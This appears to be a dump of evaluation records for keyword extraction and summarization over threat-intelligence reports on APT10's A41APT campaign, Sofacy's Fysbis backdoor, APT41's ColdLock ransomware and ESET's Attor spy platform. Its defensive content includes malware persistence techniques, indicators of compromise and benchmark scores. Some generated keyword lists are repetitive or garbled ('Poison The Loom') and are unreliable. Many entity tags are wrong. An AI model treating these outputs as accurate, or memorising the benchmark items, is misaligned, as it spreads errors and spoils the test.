APT10 [ORG] THREAT [ORG] ANALYSIS [ORG] REPORT ( ADEO IT Consulting Services)url Spotlight : [ORG] MenuPass / [ORG] QuasarRAT [ORG] Backdoor [ORG] SodaMasterAny [ORG] Questions ?", "generated_text": "APT; Japan; March 2019; January 2021; the attackers; SSL VPN abuse; implants; DESLoader; SodaMaster; P8RAT; FYAntiLoader; DESKTOP-A41UVJV; samples; the infrastructure; encryption; the malware; RSA; XOR; DES; AES; RSA; the campaign; stdout.exe; IOCs; the malware; detection; XOR; RSA; servers; the IP; IP addresses; URIs; IP addresses; the campaign; a list; IP addresses; the attackers.", "ref_text": "<START-1>The presentation analyzes an APT campaign called A41APT that was active from March 2019 to January 2021, targeting Japanese companies including overseas branches. The campaign leveraged vulnerabilities in SSL-VPNs for initial intrusion then used RDP for lateral movement. It deployed multi-layer malware like DESLoader and payloads such as SodaMaster, P8RAT, and FYAntiLoader. The malware was fileless, encrypted C2 communications, and deleted logs to evade detection. Infrastructure analysis found distinctive hostnames were used for initial intrusion and IP addresses rather than domains for C2 servers. There was little IP address reuse. Attribution assessment showed potential connections to Chinese APT groups APT10 and BlackTech based on malware similarities. However, specific attribution could not be made conclusively. The presentation outlines detection and mitigation measures like multi-factor authentication, patching, enhanced monitoring, payload detection, and information sharing. It notes that with vigilance, even stealthy targeted attacks can be detected.<END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.389261744966443, "gpt3/lexical/rouge_rouge2": 0.14189189189189186, "gpt3/lexical/rouge_rougeL": 0.2550335570469799, "gpt3/lexical/rouge_rougeLsum": 0.2550335570469799, "gpt3_generated_text": ["This article provides an overview of the A41APT campaign, which took place from March 2019 to January 2021 and targeted Japanese companies, including overseas branches. The attackers used SSL VPN abuse as the infection vector and deployed various implants such as DESLoader, SodaMaster, P8RAT, and FYAntiLoader. The DESLoader, also known as SigLoader, Ecipekac, and HEAVYHAND, is a unique multi-layer loader that uses DLL side-loading and fileless implants to load payloads. The article includes examples of the payload loading flow and the encryption algorithms used by the DESLoader. The analysis also reveals the infrastructure used by the threat actors, including IP addresses and URIs associated with the campaign. The article concludes by discussing the difficulties in detecting the attacker's intrusion and provides a list of IOCs (indicators of compromise) for malware detection. Overall, this article provides valuable insights into the A41APT campaign and the techniques employed by the attackers."]}, {"split_name": "val", "sample_id": "val_13", "prompt_text": "Extract the keywords: [CARDINAL] 24POSTED BY : [PERSON] Bryan [PERSON] Lee and [PERSON] Rob [PERSON] Downs on [DATE] February 12 , [DATE] 2016 3:00 PMFILED IN : Malware , Threat Prevention , Unit 42 TAGGED : Fysbis , Linux , [ORG] SofacyThe [ORG] Sofacy group , also known as [GPE] APT28 and Sednit , is a fairly well known cyber espionage group believed to have ties to [GPE] Russia . Their targets have spanned all across the world , with a focus on government , defense organizations and various [NORP] Eastern [NORP] European governments . There have been numerous reports on their activities , to the extent that a [ORG] Wikipedia entry has even been created for them . Get Updates Sign up to receive the latest news , cyber threat intelligence and research from Unit 42.From these reports , we know that the group uses an abundance of tools and tactics , ranging across [DATE] zero - [DATE] day exploits targeting common applications such as [PERSON] Java or [ORG] Microsoft [ORG] Office , heavy use of spear - phishing attacks , compromising legitimate websites to stage watering - hole attacks , and targeting over a variety of operating systems \u2013 Windows , [ORG] OSX , Linux , even mobile iOS.Business EmailSubmitThe Linux malware [ORG] Fysbis is a preferred tool of Sofacy , and though it is not particularly sophisticated , Linux security in general is still a maturing area , especially in regards to malware . In short , it is entirely plausible that this tool has contributed to the success of associated attacks by this group . This blog post focuses specifically on this Linux tool preferred by Sofacy and describes considerations and implications when it comes to Linux malware . [ORG] Fysbis is a modular Linux trojan / backdoor that implements plug - in and controller modules as distinct classes . For reference , some vendors categorize this malware under the [ORG] Sednit attacker group naming designation . This malware includes both 32 - bit and [CARDINAL] 64 - bit versions of Executable and Linking Format ( ELF ) binaries . Additionally , [ORG] Fysbis can install itself to a victim system with or without root privileges . This increases the options available to an adversary when it comes to selecting accounts for installation . Summary information for the [CARDINAL] three binaries we analyzed follows : MD5 Install as root [ORG] Root install desc Install as non - root Non - root install Install as root [ORG] Root install desc [CARDINAL] 3072 : n+1R4tREtGN4qyGCXdHPYK9l0H786 O26BmMAwyWMn / qwwiHNl : n+1R43QcIL XdF0w6IBmMAwwCwwi 141.2 [PERSON] KB ( 144560 bytes ) ELF [QUANTITY] 64 - bit ( stripped ) /bin / rsyncd synchronize and backup service ~/.config / dbus - notifier / dbus - inotifier system service d - bus notifierazureon - line[.]com ( TCP/80 ) 9ZAxHANJAvbuZf454UN+rv eQLZPTrV3Z [CARDINAL] 175.9 [PERSON] KB ( [DATE] 180148 bytes ) ELF 32 - bit ( stripped ) /bin / ksysdefd system kernel service defender ~/.config / ksysdef / ksysdefdSelect a [ORG] CategorySelect a MonthMORE \u2192Palo Alto [ORG] Networks [ORG] News of the Week \u2013 [DATE] February [DATE] 13 posted by [PERSON] Anna [PERSON] Lough on [DATE] February [DATE] 13 , [DATE] 2016 A Look Into Fysbis : Sofacy \u2019s [PERSON] Linux [PERSON] Backdoor posted by [PERSON] Bryan [PERSON] Lee on [DATE] February 12 , [DATE] 2016 The Cybersecurity Canon : Dragnet Nation posted by [ORG] Palo [ORG] Alto [ORG] Networks on [DATE] February 12 , [DATE] 2016 Channel Scoop \u2013 [DATE] February 12 , [DATE] 2016 posted by [ORG] Lang [ORG] Tibbils on [DATE] February 12 , [DATE] 2016 The Cybersecurity Canon : Cyberdeterrence and [ORG] Cyberwar posted by [ORG] Palo [ORG] Alto [ORG] Networks on [DATE] February [DATE] 11 , [CARDINAL] 2016MORE \u2192Non - root install [PERSON] Usage [PERSON] Timeframesystem kernel service [GPE] defender198.105.125[.]74 ( TCP/80 ) Early 2015Table [CARDINAL] 2 : Sample [CARDINAL] 2 \u2013 Early 2015 Sofacy 32 - bit FysbisMD5 Install as root [ORG] Root install desc Install as non - root Non - root install [CARDINAL] 6144 : W / D5tpLWtr91gmaVy+mdckn6BCUd c4mLc2B9:4D5Lqgkcj+ [CARDINAL] 314.4 [PERSON] KB ( [CARDINAL] 321902 bytes ) ELF [QUANTITY] 64 - bit ( not stripped ) /bin / ksysdefd system kernel service defender ~/.config / ksysdef / ksysdefd system kernel service defendermozilla - plugins[.]com ( TCP/80 ) [CARDINAL] Late [CARDINAL] 2015Table [CARDINAL] 3 : Sample [CARDINAL] 3 \u2013 Late 2015 Sofacy [CARDINAL] 64 - bit [ORG] FysbisOverall , these binaries are assessed as low sophistication , but effective . They epitomize the grudging reality that [ORG] Advanced [ORG] Persistent [ORG] Threat ( [ORG] APT ) actors often do n\u2019t require advanced means to affect their objectives . Rather , these actors more often than not hold their advanced malware and [DATE] zero [DATE] day exploits in reserve and employ just enough resources to meet their goals . It is only fair that defenders use any shortcuts or tricks at their disposal to shorten the amount of time it takes to assess threats . In other words , defenders should always look for ways to work smarter before they have to work harder . Binary strings alone revealed a good amount about these files , increasing the efficacy of activities such as static analysis categorization ( e.g. , [PERSON] Yara ) . [CARDINAL] One example of this is [NORP] Fysbis installation and platform targeting information for the samples in Table 1 and [LAW] Table [LAW] 2.Figure [LAW] 1 : Sofacy Fysbis installation and platform targeting found in stringsIn this case , we can see the binary installation path and local reconnaissance to determine which flavor of Linux the malware is running . This is followed by a number of Linux shell command style commands related to the malware establishing persistence . Another example of easily obtained information from these samples is capability based . Figure [CARDINAL] 2 : Sofacy Fysbis capability related leakage through stringsFigure [CARDINAL] 2 shows interactive status / feedback strings that can give a defender an initial profile of capabilities . In addition to contributing to static analysis detections , this can be useful as a starting point for further incident response prioritization and qualification of the threat . Interestingly , the most recent [ORG] ELF 64 - bit binary we analyzed ( [LAW] Table [LAW] 3 ) was not stripped prior to delivery , which offered additional context in the form of symbolic information . Defenders more familiar with Windows Portable Executable ( PE ) binaries can equate this with compilation of a Debug version versus a [NORP] Release version . For comparison , if we were to inspect [ORG] Fysbis \u201c [ORG] RemoteShell \u201d associated strings in one of the stripped variants , we would only see the following : Figure [CARDINAL] 3 : Sofacy Fysbis stripped binary string references to [ORG] RemoteShell capabilityCompare this with what is available from the non - stripped variant : Figure [CARDINAL] 4 : Sofacy Fysbis non - stripped binary strings referenes to [ORG] RemoteShell capabilityLittle static analysis gifts like these can help to speed defender enumeration of capabilities and \u2013 more importantly \u2013 further contribute to correlation and detection across related samples . Additionally , this latest sample demonstrated minor evolution of the threat , most notably in terms of obfuscation . Specifically , both samples in [LAW] Table [LAW] 1 [LAW] and [LAW] Table [LAW] 2 leaked installation information in the clear within binary strings . This was not the case with the sample in [ORG] Table 3 . Taking a closer look at this non - stripped binary using a disassembler , the following corresponds to decoding malware installation information for a root - privilege account . Figure [CARDINAL] 5 : [ORG] Assembly code view of Sample [CARDINAL] 3 installation decodingIn this case , the symbolic information hints at the method used for decoding , with references to mask , path , name , and info byte arrays . Figure [CARDINAL] 6 : [ORG] Assembly view of Sample [CARDINAL] 3 root installation related byte arraysAs it turns out , the referenced byte mask is applied to the other byte arrays using a rolling double - XOR algorithm to construct malware installation paths , filenames , and descriptions for a [PRODUCT] Linux root account . Corresponding INSTALLUSER byte arrays exist , which facilitate the non- root installation for the trojan . The same masking method is also used by the binary to decode malware configuration C2 information , further showcasing how a little symbolic information can go a long way towards completeness and higher confidence in assessment of a malware sample . If you would like to learn more about how [NORP] Fysbis works , the samples analyzed remain fairly consistent with the sample analysis found here . As Unit 42 has discussed in depth in other blog articles , we have observed that adversaries in general are seemingly hesitant in changing their infrastructure . This may be due to not wanting to commit additional resources , or simply a matter of retaining familiarity for the sake of timeliness . In either case , we see the same type of behavior here with the [NORP] Fysbis samples in use by Sofacy . The oldest sample ( [LAW] Table [LAW] 1 ) , was found to beacon to the domain azureon - line[.]com , which had already been widely publicized as a known command and control domain for the [ORG] Sofacy group . Using passive [ORG] DNS , we can see that [CARDINAL] two of the original IPs this domain resolved to , [CARDINAL] 193.169.244[.]190 and [CARDINAL] 111.90.148[.]148 also mapped to a number of other domains that had been in use by the [ORG] Sofacy group during that time period . Figure [CARDINAL] 7 : Sample 1 C2 resolutionsThe [ORDINAL] first of the newer samples ( [LAW] Table [LAW] 2 ) , continues the trend and beacons to an [ORG] IP also widely associated with the [ORG] Sofacy group , 198.105.125[.]74 . This [ORG] IP has been mostly associated with the tool specifically known as [ORG] CHOPSTICK , which can be read about here . Figure [CARDINAL] 8 : Sample [CARDINAL] 2 C2 resolutionsThe newest sample ( [LAW] Table [LAW] 3 ) , introduces a previously unknown command and control beacon to mozilla - plugins[.]com . This activity aligns with the previously observed Sofacy group tactic of integrating legitimate company references into their infrastructure naming convention . Neither this new domain nor the [ORG] IP it resolves to have been observed in the past , indicating that the sample in Table 3 may be associated with a newer campaign . Comparing this sample \u2019s binary with the other [CARDINAL] two however , shows there are significant similarities on the code level as well as in terms of shared behavior . Figure [CARDINAL] 9 : Sample [CARDINAL] 3 C2 resolutionsLinux is used across business and home environments and appears in a variety of form factors . It is a preferred platform within data centers and the cloud for businesses , as well as an ongoing favorite when it comes to a majority of Internet - facing web and application servers . Linux is also at the foundation of [ORG] Android devices and a number of other embedded systems . The value proposition of Linux \u2013 especially when it comes to its use in the enterprise \u2013 can be broken out into [CARDINAL] three perceived benefits : lower total cost of ownership ( TCO ) , security , and feature set . While numbers and comparison alone can contribute to measurement of [ORG] TCO and feature set , security requires further qualification . Expertise in the Linux platform is highly sought after across all industries for multiple disciplines , from system administration to big data analytics to incident response . The majority of businesses still maintain Windows - heavy user environments where certain core infrastructure components also operate under Windows servers ( e.g. , [WORK_OF_ART] Active [WORK_OF_ART] Directory , [ORG] SharePoint , etc . ) . This means , from a practical perspective , most of a business \u2019s focus remains on supporting and protecting Windows assets . Linux remains a mystery to a number of enterprise IT specialists \u2013 most critically for network defenders . Identifying and qualifying potential incidents requires a familiarity with what constitutes normal operation in order to isolate anomalies . The same is true for any other asset in an environment , normal operation is entirely dependent on a given asset \u2019s role / function in the enterprise . Lack of expertise and visibility into non - Windows platforms combine in some environments to present significant risks against an organization \u2019s security posture . As a recent caution , the Linux vulnerability described under CVE-2016 - 0728 further demonstrates the potential breadth of real - world risks to associated platforms . A natural extension of this exposure is increased targeting by both dedicated and opportunistic attackers across various malicious actor motivations . Despite the lingering belief ( and false sense of security ) that Linux inherently yields higher degrees of protection from malicious actors , Linux malware and vulnerabilities do exist and are in use by advanced adversaries . To mitigate associated risks requires tailored integration of the people , processes , and technology in support of prevention , monitoring , and detection within an environment . Linux malware detection and prevention is not prevalent at this time , but [GPE] Palo [GPE] Alto [GPE] Networks customers are protected through our next - generation security platform : [ORG] IPS signature [DATE] 14917 deployed to identify and prevent command and control activityThe C2 domains and files mentioned in this report are blocked in our Threat Prevention 3072 : n+1R4tREtGN4qyGCXdHPYK9l 0H786O26BmMAwyWMn / qwwiHNl : n [DATE] 6144 : W / D5tpLWtr91gmaVy+mdckn6 synchronize and backup service ~/.config / dbus - notifier / dbus - inotifier system service d - bus notifier /bin / ksysdefd ~/.config / ksysdef / ksysdefd system kernel service defender azureon - line[.]com 198.105.125[.]74mozilla - plugins[.]com Mozillaplagins[.]comC2 [PERSON] C2Name * Email * WebsitePost CommentPrivacy Policy Legal Notices Site Index SubscriptionsCopyright \u00a9 2007 - 2013 Palo Alto Networks", "generated_text": "Fysbis; Linux malware; Sofacy; APT28; Sednit; government; defense organizations; Eastern European governments; zero-day exploits; Java; Microsoft Office; spear-phishing attacks; malware; control modules; root privileges; a variety; operating systems; Windows; OSX; Linux; mobile iOS; the attackers; the malware; the Sednit group; the group; zero-day exploits; exploit files; zero-days; zero-day exploits; zero-day attacks; zero-day exploits; zero-day targets; zero-day exploits; Poison The Loom; detection; the group; tools.", "ref_text": "<START-1>The PDF discusses the Linux malware Fysbis, which is used by the cyberespionage group Sofacy (also known as APT28 and Sednit). Fysbis is a modular trojan/backdoor for Linux that can install itself with or without root privileges. The PDF analyzes 3 samples of Fysbis from late 2014, early 2015, and late 2015. It examines the installation paths, command and control domains, capabilities, and other characteristics of each sample. Key findings: Fysbis uses common legitimate service names as cover for its installation paths, such as rsyncd, ksysdefd, dbus-inotifier. The C2 domains and IPs tie back to known Sofacy infrastructure. Azureon-line[.]com, 193.169.244[.]190, 111.90.148[.]148 were seen in late 2014. 198.105.125[.]74 was seen in early 2015 and associated with the CHOPSTICK malware. Mozilla-plugins[.]com was a new C2 domain seen in late 2015. Analysis of strings in the samples revealed functionality like command execution, file download, and remote shell. The non-stripped sample gave more insight through symbolic info. Obfuscation of the installation paths and C2 information evolved over the samples via encoded byte arrays and rolling XOR decryption. The simple but effective nature of Fysbis shows APT groups don't always need advanced malware to achieve their goals. The PDF emphasizes that Linux malware exists and defenders need Linux expertise/visibility to detect threats. IPS signatures, domain blocking, and other Anti-APT protections are discussed. In summary, the PDF provides an in-depth look at the Fysbis malware from the Sofacy APT group, its evolution and detection over time, and the need for Linux threat awareness. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.38578680203045684, "gpt3/lexical/rouge_rouge2": 0.14285714285714285, "gpt3/lexical/rouge_rougeL": 0.24365482233502536, "gpt3/lexical/rouge_rougeLsum": 0.24365482233502536, "gpt3_generated_text": ["The article discusses the Linux malware known as Fysbis, which is a preferred tool of the cyber espionage group Sofacy, also known as APT28 and Sednit. Sofacy is believed to have ties to Russia and has targeted government, defense organizations, and Eastern European governments. The group uses a variety of tools and tactics, including zero-day exploits, spear-phishing attacks, and compromising legitimate websites. Fysbis is a modular Linux trojan/backdoor that can be installed with or without root privileges, giving the attackers more options when selecting accounts for installation. The article analyzes three versions of the Fysbis malware and concludes that they are low in sophistication but effective. The use of Linux malware highlights the need for improved Linux security, as the area is still maturing."]}, {"split_name": "val", "sample_id": "val_14", "prompt_text": "Extract the keywords: www.trendmicro.com /en_gb / research/20 / i / u - s -- justice - department - charges - apt41 - hackers - over - global - cyberattacks.html [GPE] U.S. Justice Department Charges [PERSON] APT41 [PERSON] Hackers over [PERSON] Global [PERSON] Cyberattacks \u22ee 9/18/2020APT [ORG] & [ORG] Targeted [ORG] AttacksThe [ORG] United [ORG] States [ORG] Justice [ORG] Department announced that it was charging [CARDINAL] five [NORP] Chinese citizens with hacking crimes committed against [CARDINAL] over [CARDINAL] 100 institutions in [GPE] the [GPE] United [GPE] States and abroad . These [CARDINAL] five individuals were reportedly connected to the hacking group known as APT41.On [DATE] September 16 , [DATE] 2020 , [GPE] the [GPE] United [GPE] States [GPE] Justice [GPE] Department announced that it was charging [CARDINAL] five [NORP] Chinese citizens with hacking crimes committed against [CARDINAL] over [CARDINAL] 100 institutions in [GPE] the [GPE] United [GPE] States and abroad . The global hacking campaign went after a diverse range of targets , from video game companies and telecommunications enterprises to universities and non - profit organizations . The [CARDINAL] five individuals were reportedly connected to the hacking group known as APT41 . At the time of writing , they remain fugitives , but [CARDINAL] two [NORP] Malaysian citizens have been arrested for aiding the hackers . [CARDINAL] Three related indictments unsealed by [ORG] the [ORG] Justice [ORG] Department laid out the group 's wide range of malicious activities , including crypto - jacking and ransomware attacks . Most of the activities appear to have been done for profit , but some were for espionage purposes . [ORG] Justice officials say that the group 's intrusions allowed the hackers to steal source code , customer account data , and personally identifiable information ( PII ) . Other notable activities include defrauding video game companies by manipulating in - game resources , and launching a ransomware attack on the network of a non - profit organization dedicated to combating global poverty . The hackers used publicly available exploits and common vulnerabilities , which are listed in the official report . They also employed sophisticated hacking techniques to gain and maintain access to the victim 's computer networks . The official report outlined how the team used \" supply chain attacks \" in which they compromised software providers and modified the code they were giving their customers . This also allowed the threat actors to compromise the customers and spread their influence further . This is not the [ORDINAL] first time that APT41 activities have been scrutinized \u2014 the group has been active for some time . [DATE] Just [DATE] last [DATE] May , [ORG] Trend [ORG] Micro connected the group to ransomware attacks on [NORP] Taiwanese organizations . The new ransomware family , which we dubbed [ORG] ColdLock , is potentially destructive as it appears to target databases and email servers for encryption . The attack chain of ransomware incidents in [ORG] TaiwanThe [ORG] Trend [ORG] Micro [ORG] Research team investigated the [PRODUCT] ColdLock ransomware attack , which actually targeted the energy industry in [GPE] Taiwan . The ransomware attack chain is outlined in Figure [CARDINAL] 1 ; however , we currently1/4do not know the initial arrival vector of this threat into a potential victim 's network . Our analysis focused on the way the attacker spreads the ransomware to infect as many machines as possible.1 . The threat actor enters a victim 's network environment and obtains the account username andpassword of the company headquarters ' active directory server.2 . After logging in to the active directory server , the threat actor modifies the active directory servergroup policy object \u2014 this includes a request that all domain account members create a scheduled task and execute the malware.3 . In the final step , the other subsidiary active directory servers and all the endpoint machines willdownload the scheduled task and execute the ransomware . Figure.1 The attacker uses [LAW] an [LAW] Active [LAW] Directory ( AD ) scheduled task to deploy the ransomware in the customer environment . Scheduled tasks play a very important role in this incident . The threat actors use a scheduled task command to spread and infect a victim 's environment . The screenshot in Figure [CARDINAL] 2 shows how the threat actor uses [ORG] SMB and internal IIS Web Service to copy \" lc.tmp \" ( the main ransomware loader in this incident ) to other victims ' host machines . After that , the [ORG] PowerShell command executes the main ransomware loader.2/4Figure [CARDINAL] 2 . How a scheduled task delivers the malware to a victim 's environmentThe right tool for the jobBefore the ransomware attack , the attacker was likely already hiding in the victims ' environments for some time . We found the same customized loaders installed as Windows services in every victim 's environment , and those infected machines were in positions that allowed them to reach other machines under the subnets . The loaders decrypted the next - stage payloads , which were either embedded inside itself or stored on the disk as separate files . The next - stage payloads were [ORG] CobaltStrike in this series of incidents . After the loader and payload pairs were successfully installed , the attacker started poking around the environments with tools like password dumpers and HTTP tunneling tools \u2014 then the ransomware attacks were launched [DATE] one [DATE] month [DATE] later . More than just a single occurrenceDuring the investigation , we discovered more incidents that are possibly related to the one discussed above . We did this by checking the indicator overlap and the [ORG] C&C infrastructure overlap . Based on the distribution of the linked indicators , the attacker(s ) appears to be interested in energy , retail , and telecom companies , mainly in [LOC] Southeast [LOC] Asia . They mostly conduct espionage activities \u2014 lurking in the environments for a long period and packing the data that interested them . They also seem to be updating the backdoors and toolsets they use . Possible link to [NORP] Chinese espionageThe [ORG] C&C server [CARDINAL] 104[.]233[.]224[.]227 was hosted under a small hosting service with only 64 IPs under it . The [ORG] IP range was registered to an address in [GPE] Inner [GPE] Mongolia , [GPE] China . The [ORG] C&C server was abandoned [DATE] several [DATE] days after the incidents , and now the [ORG] IP is hosting a Simplified - Chinese site . [ORG] Trend [ORG] Micro Solutions3/4Sophisticated hacking groups have versatile tools and are persistent threats . Users should deploy more robust and proactive defenses to be adequately protected against these groups . The following [ORG] Trend [ORG] Micro [ORG] Solutions are recommended : [ORG] Trend [ORG] Micro [ORG] XDR for Users : Applies AI and analytics for earlier detection of threats across endpoints and other layers of the system [ORG] Trend [ORG] Micro [ORG] Apex [ORG] One \u2122 : Provides actionable insights , expanded investigative capabilities , and centralized visibility across the network . [ORG] Trend [ORG] Micro \u2122 [ORG] Deep [ORG] Discovery \u2122 Email Inspector : Detects , blocks , and analyzes malicious email attachments through custom sandboxing and other detection techniquesTo help defend users against APT41 specifically , we have developed an assessment tool that can scan endpoints for file - based indicators collected from global intelligence sources . Indicators of CompromiseMalware FamilySHA-1", "generated_text": "Chinese citizens; APT41; over 100 institutions; the United States; the Chinese; APT41 Hackers; over 100 institutions; over 100 institutions; video game companies; telecommunications; universities; non-profit organizations; the group; exploits; customers; data; Defrauding; video game companies; de-game resources; a ransomware attack; ColdLock; Taiwanese organizations; the energy industry; the attacker; scheduled tasks; the victim; the attacker; the victim; the ransomware; the attacker; the victim; Remote Access; obfuscation; lateral movement; the network; infrastructure; the group; the threat; this threat; information; espionage; part; the group; fugitives; Malaysian citizens; the group.", "ref_text": "<START-1>In September 2020, the U.S. Justice Department charged 5 Chinese citizens associated with the APT41 hacking group for cyberattacks on over 100 organizations globally. The hackers engaged in cryptojacking, ransomware attacks, theft of source code and PII, video game fraud, and more. They used public exploits and supply chain attacks to compromise targets. Trend Micro had connected APT41 to ransomware attacks on Taiwan organizations earlier in 2020. The ransomware, called ColdLock, spread via Active Directory and scheduled tasks. Further analysis found the group was lurking in target networks for months beforehand, using custom loaders and Cobalt Strike. They targeted energy, retail, telecom, and more in Southeast Asia. Infrastructure links suggest ties to Chinese espionage. APT41 has sophisticated tools and is a persistent threat, requiring robust defenses like AI-powered detection, sandboxing, and threat intelligence. In summary, the PDF covers the U.S. charges against APT41 hackers as well as previous research connecting them to wide-ranging cyberattacks and espionage, emphasizing the need for strong security measures. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4746666666666667, "gpt3/lexical/rouge_rouge2": 0.10723860589812333, "gpt3/lexical/rouge_rougeL": 0.21333333333333337, "gpt3/lexical/rouge_rougeLsum": 0.21333333333333337, "gpt3_generated_text": ["The United States Justice Department has charged five Chinese citizens connected to the hacking group APT41 with hacking crimes against over 100 institutions in the United States and abroad. The targets of the global hacking campaign included video game companies, telecommunications enterprises, universities, and non-profit organizations. The hackers used publicly available exploits and common vulnerabilities to gain access to the victim's computer networks. They also employed sophisticated techniques such as supply chain attacks to compromise software providers and spread their influence further. The group's malicious activities included crypto-jacking, ransomware attacks, and espionage. The hackers stole source code, customer account data, and personally identifiable information. Two Malaysian citizens have been arrested for aiding the hackers, while the five individuals remain fugitives. This is not the first time that APT41 activities have been scrutinized, as the group has been active for some time. In a separate incident, the Trend Micro Research team investigated a ransomware attack known as ColdLock, which targeted the energy industry in Taiwan. The attackers used an Active Directory scheduled task to deploy the ransomware in the victim's environment. The investigation also revealed that the attackers had been hiding in the victim's environments for some time before launching the ransomware attacks."]}, {"split_name": "val", "sample_id": "val_15", "prompt_text": "Extract the keywords: ESET Research white papersTLP : [ORG] WHITEAT [ORG] COMMANDS , MEET ATTOR , [ORG] A [ORG] FANTASY [ORG] CREATURE AND ALSO A [ORG] SPY PLATFORMAuthor : [PERSON] Zuzana [PERSON] Hromcov\u00e1In the fantasy book \u201c [WORK_OF_ART] A [WORK_OF_ART] Court [WORK_OF_ART] of [WORK_OF_ART] Thorns [WORK_OF_ART] and [WORK_OF_ART] Roses \u201d by [PERSON] Sarah [PERSON] J. [PERSON] Maas , Attor was an evil [GPE] Faerie . In that book , the [ORG] Faeries ruled over all the known world and humans were their slaves . In cybersecurity , Attor is a cyberespionage platform designed to exfiltrate valuable information from its victims . SUMMARY ESET researchers have discovered a previously unreported cyberespionage platform used in targeted attacks since at least 2013 . Focusing on diplomatic missions and governmental institutions , Attor is designed specifically to attack privacy - concerned targets . Its most interesting features are a complex modular architecture , elaborate network communications , and a unique plugin to fingerprint GSM devices .Attor \u2019s core lies in its dispatcher , which serves as a management and synchronization unit for additional plugins . It also provides an interface for the plugins to call Windows APIs and cryptographic functions indirectly .Plugins themselves are heavily synchronized , with network communication alone being spread across [CARDINAL] four different components , each implementing a different layer . This allows the malware to communicate with its [ORG] FTP C&C server , which resides on an onion domain . Tor is used for communication , aiming for anonymity and untraceability , and the overall setup makes it impossible to analyze the communication unless all pieces of the puzzle have been collected .Apart from its dispatcher , all of Attor \u2019s capabilities are provided as plugins . This allows the attackers to customize the platform on a per - victim basis . The most notable plugin can detect connected GSM/ [ORG] GPRS modems or mobile devices ; this allows Attor to speak to them directly using the AT command set , in order to collect sensitive information such as the [ORG] IMEI , [ORG] IMSI or MSISDN numbers , possibly identifying both the device and its subscriber . Other plugins provide persistence , an exfiltration channel , [ORG] C&C communication and several further spying capabilities .We gave Attor its name because of [CARDINAL] two notable features of the platform : the AT protocol used by the [ORG] GSM plugin , and that Tor is employed for network communication .2 THE ESPIONAGE CAMPAIGN Attor has been used in a highly targeted espionage campaign ; we have only seen [CARDINAL] a [CARDINAL] few [CARDINAL] dozen victims . In general , Attor seems to be targeting [LANGUAGE] Russian - speaking users . This claim is supported by the fact that most of the targets are located in [GPE] Russia , and that the malware focuses on [NORP] Russian applications : for example , it takes screenshots of [NORP] Russian [PERSON] Instant [PERSON] Messenger ( [ORG] IM ) apps .Other targets are located in [LOC] Eastern [LOC] Europe , and they include diplomatic missions and governmental institutions .RussiaUkraineSlovakiaLithuaniaTurkeyFigure [CARDINAL] 1 // Countries affected by Attor3The campaign has been active in [CARDINAL] two waves , with different implementations of the platform , and substantial changes in architecture . We saw the [ORDINAL] first activity in [DATE] 2013 , while the most recent version has been active at least since [DATE] 2018 , with the latest samples detected in [DATE] July [DATE] 2019 .We do n\u2019t know how the malware was initially distributed to its victims and executed . It is also difficult to establish the exact timeline of the operation , especially with such a small number of targets . The malware may have been used much longer : it could have been in use for [DATE] years before we encountered it .The PE timestamp information in the samples suggests compilation dates between [DATE] 2005 and [DATE] 2009 for the older version , and [DATE] between [DATE] 2011 [DATE] and [DATE] 2013 for the newer , but this information is likely fabricated . For example , in one of the samples1 , the [ORG] PE header contains [DATE] July 14th , [DATE] 2009 as the compilation date , which is inconsistent with other metadata . Namely , the product version [CARDINAL] 1 .626 .7601 .17514 in the sample \u2019s version info was apparently copied from a Windows 7 RTM library ( usp10.dll ) , in an attempt to make the file look more credible . However , that library was only released on [DATE] November 20th , [DATE] 2010 , and thus its product version could not have been known in [DATE] July [DATE] 2009 . This is a clear indicator that the timestamp is fake .Therefore , we rely solely on our telemetry , which suggests that samples of the older version were used between 2013 and [DATE] 2017 , while the updated , modernized version has been in use since [DATE] 2018 .Figure [CARDINAL] 2 // Metadata from the malicious file showing that the [ORG] PE timestamp was forged to an older date1 SHA-1 : 6DEC7C66CB5E6F86CDDBE313B604603731C78E2043 [ORG] THE [ORG] PLATFORM [ORG] ARCHITECTURE In this paper , we focus on the newer version of Attor that has been active since [DATE] 2018 . This version consists of a dispatcher and loadable plugins , that use shared folders for synchronization , and provide functionality to each other .In the [ORDINAL] first step of a compromise , a dropper delivers the main dispatcher and a number of plugins , and then loads the dispatcher , which is a dynamic - link library .The dispatcher injects itself into almost all running processes and loads additional plugins within each of these processes . Attor avoids some system processes and [NORP] Symantec products .A feature characteristic to Attor is that the plugins then choose in which of the processes to activate their payload . For example , a [GPE] Screengrabber plugin only captures screenshots of the window of a process in which it is injected , which allows monitoring only processes that are of interest of the attackers ( such as [NORP] IM applications or web browsers ) .Attor has built - in mechanisms for adding new plugins , for updating itself , and for automatically exfiltrating collected data and log files .In subsequent sections , we explain how individual components of the platform contribute to these mechanisms , as is also illustrated in Figure [CARDINAL] 3 .ID 0x00 DispatcherLoadsInstallsPLUGINS PERSISTENCEID 0x10Installer / watchdogCOLLECTIONEXFILTRATIONCOMMAND AND CONTROLFTPID 0x06 File uploaderDownloads commandsID 0x06Command dispatcherStores downloaded plugins , updates and other \ufb01lesStorecollected dataUpload folderPluginsUpdatesResourcesCollecteddata and logsLoaded by the main modulewith each executionExecuted and deleted by the main moduleMiscellaneous \ufb01lesFigure [CARDINAL] 3 // Attor \u2019s architecture . Note that ID 0x06 represents a single plugin , but the functionality is split here into [CARDINAL] two parts for clarity .53.1 Persistence The [ORG] Installer / watchdog plugin is responsible for ensuring Attor \u2019s persistence , by scheduling a task that loads the dispatcher .In some versions of the malware , the dispatcher itself is responsible for this functionality , using [CARDINAL] one of [CARDINAL] two mechanisms depending on the privileges with which the malware was initially executed . Regardless of the persistence method , one of Attor \u2019s threads monitors whether it is still installed on the system , and reinstalls it if not .The [ORDINAL] first technique used by the dispatcher is to create a logon script that loads the dispatcher [ORG] DLL ( using rundll32.exe ) at each user logon . To achieve this , malware sets the UserInitMprLogonScript value under the HKEY_CURRENT_USER\\Environment registry key .If running in a privileged context , it registers the dispatcher as a service , and installs it to be executed on each system start by adding the service name to the netsvcs group .Notably , Attor also instructs the service to be executed in Safe Mode and Safe Mode with Networking . This is achieved by creating a subkey for the malicious service under the [PRODUCT] SafeBoot registry [PERSON] keys:\u2022 [PERSON] 